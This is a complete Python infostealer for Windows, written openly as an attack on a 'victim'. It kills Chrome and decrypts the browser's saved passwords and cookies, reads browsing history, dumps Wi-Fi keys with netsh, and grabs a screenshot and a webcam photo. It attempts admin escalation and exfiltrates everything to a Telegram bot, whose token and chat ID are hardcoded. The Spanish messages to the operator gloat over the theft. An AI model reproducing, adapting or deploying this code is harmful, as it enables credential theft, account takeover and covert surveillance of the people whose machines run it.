import subprocess
import sys
import importlib
import requests
import platform
import socket
import json
import os
import telebot
import sqlite3
import shutil
import time
import psutil
import wmi
from datetime import datetime, timedelta
from PIL import ImageGrab
import cv2
import zipfile
import win32crypt
import base64

# Auto-install with user perms and retry
def install_package(package):
    try:
        importlib.import_module(package)
        return True  # Already installed, no sweat
    except ImportError:
        for attempt in range(2):  # Retry once if it flops
            try:
                subprocess.check_call([sys.executable,"-m","pip","install", package,"--user"])
                importlib.import_module(package)  # Double-check it loaded
                return True
            except subprocess.CalledProcessError as e:
                print(f"Install attempt {attempt + 1} fucked up: {str(e)}")
                time.sleep(1)  # Chill a sec before retry
            except ImportError:
                print(f"Installed {package} but still can’t load it, what the fuck?")
        return False

# Required packages
required_packages = ["requests","telebot","psutil","pillow","opencv-python","pywin32","wmi"]
for pkg in required_packages:
    if not install_package(pkg):
        print(f"Couldn’t install {pkg}, shit might break later.")

# Telegram setup
bot_token = '7814901359:AAHmh4lpUMMwGYJeqz-qF2hJDTMYLSWKU3U'  # Replace with yours
chat_id = '7972070393'  # Replace with yours
bot = telebot.TeleBot(bot_token)

# Admin check and escalation
def is_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def run_as_admin():
    if not is_admin():
        try:
            subprocess.call(['runas', '/user:Administrator', f'"{sys.executable}" "{os.path.abspath(__file__)}"'])
            sys.exit()
        except:
            bot.send_message(chat_id,"Couldn’t escalate to admin, might miss some juicy shit.", disable_notification=True)

# Kill Chrome
def kill_chrome():
    try:
        subprocess.run('taskkill /IM chrome.exe /F', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
    except:
        pass

# Chrome paths
def get_chrome_cookies_path():
    username = os.environ['USERNAME']
    base_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network"
    cookie_path = os.path.join(base_path,"Cookies")
    return cookie_path if os.path.exists(cookie_path) else None

def get_chrome_passwords_path():
    username = os.environ['USERNAME']
    base_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    password_path = os.path.join(base_path,"Login Data")
    return password_path if os.path.exists(password_path) else None

# Get Chrome cookies
def get_all_chrome_cookies():
    try:
        kill_chrome()
        cookie_path = get_chrome_cookies_path()
        if not cookie_path:
            return"No cookies file, Chrome installed?"
        temp_path ="Cookies_temp.db"
        shutil.copy2(cookie_path, temp_path)
        conn = sqlite3.connect(temp_path)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        for row in cursor.fetchall():
            host, name, encrypted_value = row
            try:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
            except:
                decrypted_value ="[Unreadable]"
            cookies.append({"Domain": host.decode('utf-8'),"Name": name.decode('utf-8'),"Value": decrypted_value})
        conn.close()
        with open("cookies.json","w", encoding='utf-8') as f:
            json.dump(cookies, f, indent=2, ensure_ascii=False)
        with zipfile.ZipFile("cookies.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("cookies.json")
        os.remove(temp_path)
        os.remove("cookies.json")
        return"cookies.zip"
    except Exception as e:
        return f"Cookie grab fucked up: {str(e)}"

# Get Chrome passwords
def get_chrome_passwords():
    try:
        kill_chrome()
        password_path = get_chrome_passwords_path()
        if not password_path:
            return"No passwords file, Chrome installed?"
        temp_path ="LoginData_temp.db"
        shutil.copy2(password_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_pass = row
            try:
                decrypted_pass = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
            except:
                decrypted_pass ="[Unreadable]"
            passwords.append({"URL": url,"User": username,"Password": decrypted_pass})
        conn.close()
        if not passwords:
            return"No passwords in Chrome, shit’s empty!"
        with open("passwords.json","w", encoding='utf-8') as f:
            json.dump(passwords, f, indent=2)
        with zipfile.ZipFile("passwords.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("passwords.json")
        os.remove(temp_path)
        os.remove("passwords.json")
        return"passwords.zip"
    except Exception as e:
        return f"Password grab fucked up: {str(e)}"

# Get Wi-Fi passwords
def get_wifi_passwords():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
        profiles = [line.split(":")[1].strip() for line in data if"All User Profile" in line]
        wifi_list = []
        for profile in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                password = [line.split(":")[1].strip() for line in results if"Key Content" in line]
                wifi_list.append({"Network": profile,"Password": password[0] if password else"No Password"})
            except:
                wifi_list.append({"Network": profile,"Password":"[Couldn’t grab]"})
        with open("wifi.json","w", encoding='utf-8') as f:
            json.dump(wifi_list, f, indent=2)
        with zipfile.ZipFile("wifi.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("wifi.json")
        os.remove("wifi.json")
        return"wifi.zip"
    except Exception as e:
        return f"Wi-Fi grab fucked up: {str(e)}"

# Get browser history
def get_browser_history():
    try:
        kill_chrome()
        username = os.environ['USERNAME']
        history_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        if not os.path.exists(history_path):
            return"No history file, Chrome installed?"
        temp_path ="History_temp.db"
        shutil.copy2(history_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
        history = []
        for row in cursor.fetchall():
            url, title, count, last_visit = row
            try:
                last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                history.append({"URL": url,"Title": title,"Visits": count,"Last Visit": str(last_visit_time)})
            except:
                history.append({"URL": url,"Title": title,"Visits": count,"Last Visit":"[Bad Date]"})
        conn.close()
        if not history:
            return"History’s empty as fuck!"
        with open("history.json","w", encoding='utf-8') as f:
            json.dump(history, f, indent=2)
        with zipfile.ZipFile("history.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("history.json")
        os.remove(temp_path)
        os.remove("history.json")
        return"history.zip"
    except Exception as e:
        return f"History grab fucked up: {str(e)}"

# Take screenshot
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path ="screenshot.png"
        screenshot.save(screenshot_path, quality=50)
        return screenshot_path
    except:
        return None

# Take webcam photo
def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            photo_path ="webcam_shot.png"
            cv2.imwrite(photo_path, frame, [cv2.IMWRITE_PNG_COMPRESSION, 9])
            cap.release()
            return photo_path
        cap.release()
        return None
    except:
        return None

# Get system info
def get_system_info():
    try:
        c = wmi.WMI()
        macs = [interface.MACAddress for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True)]
        gpus = [gpu.Name for gpu in c.Win32_VideoController()]
        ips = [addr for addr in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)]
        ip_list = list(set([ip[4][0] for ip in ips if ip[4][0] != '127.0.0.1']))
        info = ("💻 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎𝐍 𝐃𝐄𝐋 𝐄𝐐𝐔𝐈𝐏𝐎 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀 🌐\n"
                f"👤 𝐔𝐒𝐔𝐀𝐑𝐈𝐎 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐎 : {os.environ['USERNAME']}\n"
                f"🖥️ 𝐒𝐈𝐒𝐓𝐄𝐌𝐀 𝐎𝐏𝐄𝐑𝐀𝐓𝐈𝐕𝐎 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐎 : {platform.system()} {platform.release()}\n"
                f"⚙️ 𝐂𝐏𝐔 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐎 : {platform.processor()}\n"
                f"🎮 𝐆𝐏𝐔 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐀 : {' | '.join(gpus)}\n"
                f"🧠 𝐓𝐎𝐓𝐀𝐋 𝐑𝐀𝐌 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐀 : {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                f"💾 𝐑𝐀𝐌 𝐋𝐈𝐁𝐑𝐄 𝐃𝐄 𝐌𝐎𝐌𝐄𝐍𝐓𝐎 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐀 : {round(psutil.virtual_memory().available / (1024**3), 2)} 𝐆𝐁\n"
                f"💽 𝐃𝐈𝐒𝐂𝐎 (𝐂:) 𝐔𝐒𝐀𝐃𝐎 : {round(psutil.disk_usage('/').used / (1024**3), 2)} 𝐆𝐁 𝐋𝐈𝐁𝐑𝐄𝐒 𝐄𝐍 𝐃𝐈𝐒𝐂𝐎 (𝐂:) {round(psutil.disk_usage('/').free / (1024**3), 2)} 𝐆𝐁\n"
                f"🌐 𝐌𝐀𝐂 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐀 : {' | '.join(macs)}\n"
                f"📶 𝐈𝐏 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐀 : {' | '.join(ip_list)}")
        return info
    except Exception as e:
        return f"System info fucked up: {str(e)}"

# Send everything to Telegram
def send_to_telegram():
    bot.send_message(chat_id,"✅ 𝐈𝐍𝐈𝐂𝐈𝐀𝐍𝐃𝐎 𝐄𝐋 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 𝐃𝐄 𝐑𝐄𝐕𝐄𝐍𝐓𝐀𝐑 𝐀 𝐋𝐀 𝐕Í𝐂𝐓𝐈𝐌𝐀 👾 ", disable_notification=True)
    run_as_admin()



    bot.send_message(chat_id,"✅ 𝐄𝐗𝐓𝐑𝐀𝐈𝐃𝐎: 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎𝐍 𝐂𝐋𝐀𝐕𝐄 𝐂𝐇𝐑𝐎𝐌𝐄 𝐀 𝐏𝐔𝐍𝐓𝐎 𝐃𝐄 𝐂𝐀𝐄𝐑🕵️", disable_notification=True)
    passwords_file = get_chrome_passwords()

    bot.send_message(chat_id,"✅ 𝐒𝐈𝐒𝐓𝐄𝐌𝐀 𝐃𝐄𝐒𝐄𝐍𝐂𝐑𝐈𝐏𝐓𝐀𝐃𝐎 𝐄𝐒𝐓𝐄 𝐄𝐐𝐔𝐈𝐏𝐎 𝐘𝐀 𝐄𝐒 𝐌Í𝐎 🥷🏽⚡️", disable_notification=True)
    system = get_system_info()

    message = f"☠️𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎𝐍 𝐃𝐄 𝐒𝐔 𝐄𝐐𝐔𝐈𝐏𝐎 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐎 𝐃𝐄 𝐄𝐋 𝐂𝐀𝐁𝐑𝐎𝐍 𝐄𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 𝐃𝐄 𝐄𝐍𝐕𝐈𝐎☠️\n\n{system}"
    bot.send_message(chat_id, message, disable_notification=True)

    bot.send_message(chat_id,"✅ 𝐑𝐎𝐁𝐀𝐍𝐃𝐎 𝐋𝐀𝐒 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 𝐂𝐎𝐌𝐎 𝐔𝐍 𝐅𝐀𝐍𝐓𝐀𝐒𝐌𝐀 𝐄𝐍 𝐋𝐀 𝐍𝐈𝐄𝐁𝐋𝐀 💀", disable_notification=True)
    cookies_file = get_all_chrome_cookies()

    if isinstance(cookies_file, str) and cookies_file.endswith(".zip"):
        with open(cookies_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="𝐂𝐎𝐎𝐊𝐈𝐄𝐒 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀 𝐋𝐈𝐒𝐓𝐀 💻", disable_notification=True)
        os.remove(cookies_file)
    else:
        bot.send_message(chat_id, f"❌ 𝐄𝐑𝐑𝐎𝐑 𝐂𝐎𝐍 𝐋𝐀𝐒 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 𝐍𝐎 𝐃𝐄𝐒𝐄𝐍𝐂𝐑𝐈𝐏𝐓𝐀𝐃𝐀 😢💻 {cookies_file}", disable_notification=True)

    bot.send_message(chat_id,"✅ 𝐎𝐁𝐓𝐄𝐍𝐈𝐄𝐍𝐃𝐎 𝐋𝐀 𝐂𝐋𝐀𝐕𝐄 📶🌐", disable_notification=True)
    wifi_file = get_wifi_passwords()

    if isinstance(passwords_file, str) and passwords_file.endswith(".zip"):
        with open(passwords_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="✅ 𝐂𝐎𝐍𝐓𝐑𝐀𝐒𝐄𝐍𝐀𝐒 𝐄𝐍 𝐙𝐈𝐏 𝐃𝐈𝐒𝐅𝐑𝐔𝐓𝐀 💻", disable_notification=True)
        os.remove(passwords_file)
    else:
        bot.send_message(chat_id, f"❌ 𝐄𝐑𝐑𝐎𝐑 𝐃𝐄 𝐂𝐎𝐍𝐓𝐑𝐀𝐒𝐄Ñ𝐀 𝐍𝐎 𝐇𝐀𝐘 𝐂𝐎𝐍𝐓𝐑𝐀𝐒𝐄𝐍𝐀𝐒 𝐄𝐍 𝐂𝐇𝐑𝐎𝐌𝐄 𝐋𝐀 𝐌𝐈𝐄𝐑𝐃𝐀 𝐄𝐒𝐓𝐀 𝐕𝐀𝐂𝐈𝐀: {passwords_file}", disable_notification=True)

    bot.send_message(chat_id,"✅ 𝐎𝐁𝐓𝐄𝐍𝐈𝐄𝐍𝐃𝐎 𝐋𝐀 𝐂𝐋𝐀𝐕𝐄 𝐖𝐈𝐅𝐈 📶🌐", disable_notification=True)
    wifi_file = get_wifi_passwords()


    if isinstance(wifi_file, str) and wifi_file.endswith(".zip"):
        with open(wifi_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="✅ 𝐂𝐋𝐀𝐕𝐄𝐒 𝐖𝐈𝐅𝐈 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀 𝐎𝐁𝐓𝐄𝐍𝐈𝐃𝐀 𝐄𝐍 𝐙𝐈𝐏 𝐀 𝐂𝐎𝐍𝐄𝐂𝐓𝐀𝐑 💻", disable_notification=True)
        os.remove(wifi_file)
    else:
        bot.send_message(chat_id, f"❌ 𝐄𝐑𝐑𝐎𝐑 𝐂𝐎𝐍 𝐋𝐀𝐒 𝐂𝐋𝐀𝐕𝐄𝐒 𝐖𝐈𝐅𝐈 𝐍𝐎 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐀 𝐘 𝐍𝐎 𝐃𝐄𝐒𝐄𝐍𝐂𝐑𝐈𝐏𝐓𝐀𝐃𝐀 💻{wifi_file}", disable_notification=True)

    bot.send_message(chat_id,"✅ 𝐇𝐈𝐒𝐓𝐎𝐑𝐈𝐀𝐋 𝐄𝐍 𝐌𝐈𝐒 𝐌𝐀𝐍𝐎𝐒 𝐕𝐀𝐌𝐎𝐒 𝐀 𝐕𝐄𝐑 𝐐𝐔𝐄 𝐌𝐈𝐄𝐑𝐃𝐀 𝐇𝐀 𝐄𝐒𝐓𝐀𝐃𝐎 𝐌𝐈𝐑𝐀𝐍𝐃𝐎 🕸️", disable_notification=True)
    history_file = get_browser_history()

    if isinstance(history_file, str) and history_file.endswith(".zip"):
        with open(history_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="✅ 𝐇𝐈𝐒𝐓𝐎𝐑𝐈𝐀𝐋 𝐃𝐄 𝐍𝐀𝐕𝐄𝐆𝐀𝐂𝐈𝐎𝐍 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐎 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀 𝐄𝐍 .𝐙𝐈𝐏💻", disable_notification=True)
        os.remove(history_file)
    else:
        bot.send_message(chat_id, f"❌ 𝐄𝐑𝐑𝐎𝐑 𝐂𝐎𝐍 𝐄𝐋 𝐇𝐈𝐒𝐓𝐎𝐑𝐈𝐀𝐋 𝐍𝐎 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐎 💻 {history_file}", disable_notification=True)



    bot.send_message(chat_id,"✅ 𝐂𝐀𝐏𝐓𝐔𝐑𝐀 𝐎𝐁𝐓𝐄𝐍𝐈𝐃𝐀 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎𝐍 𝐃𝐄𝐋 𝐄𝐒𝐂𝐑𝐈𝐓𝐎𝐑𝐈𝐎 𝐃𝐄 𝐄𝐒𝐓𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀 📸", disable_notification=True)
    screenshot = take_screenshot()

    if screenshot and os.path.exists(screenshot):
        with open(screenshot, 'rb') as photo:
            bot.send_photo(chat_id, photo, disable_notification=True)
        os.remove(screenshot)


    bot.send_message(chat_id,"✅ 𝐖𝐄𝐁𝐂𝐀𝐌 𝐄𝐍𝐂𝐄𝐍𝐃𝐈𝐃𝐀 𝐒𝐎𝐍𝐑𝐈𝐄 𝐏𝐀 𝐋𝐀 𝐅𝐎𝐓𝐎 𝐂𝐀𝐁𝐑𝐎𝐍 😎", disable_notification=True)
    webcam = take_webcam_photo()


    if webcam and os.path.exists(webcam):
        with open(webcam, 'rb') as photo:
            bot.send_photo(chat_id, photo, disable_notification=True)
        os.remove(webcam)

    bot.send_message(chat_id,"👽 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎𝐍 𝐎𝐁𝐓𝐄𝐍𝐈𝐃𝐀 𝐂𝐎𝐑𝐑𝐄𝐂𝐓𝐀𝐌𝐄𝐍𝐓𝐄 𝐓𝐎𝐃𝐎 𝐀𝐋 𝟏𝟎𝟎% 👽", disable_notification=True)

if __name__ == "__main__":
    subprocess.Popen.send_signal = lambda*args: None
    try:
        send_to_telegram()
    except Exception as e:
        bot.send_message(chat_id, f"❌ 𝐀𝐋𝐆𝐎 𝐒𝐄 𝐉𝐎𝐃𝐈𝐎 𝐄𝐋 𝐏𝐔𝐓𝐎 𝐀𝐍𝐓𝐈𝐕𝐈𝐑𝐔𝐒 𝐍𝐎𝐒 𝐃𝐄𝐓𝐄𝐂𝐓𝐎 💀💻 {str(e)}", disable_notification=True)